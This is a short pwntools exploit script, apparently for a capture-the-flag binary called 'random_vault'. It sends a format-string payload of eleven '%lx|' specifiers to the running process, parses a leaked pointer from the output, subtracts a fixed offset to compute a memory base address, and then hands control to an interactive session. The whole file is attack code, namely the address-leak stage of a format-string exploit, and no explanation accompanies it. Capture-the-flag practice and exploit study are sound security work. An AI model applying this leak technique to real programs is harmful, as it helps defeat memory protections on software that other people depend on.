from pwn import *

context.update(log_level='debug')

p = process('random_vault')
len_name = 0x51
p.sendlineafter(': ', '%lx|'*11)

offset_bss = 0x1750
addr_base_bss = int(p.recvrepeat(1).split('|')[10], 16) - offset_bss

log.info('base: ' + hex(addr_base_bss))



p.interactive()

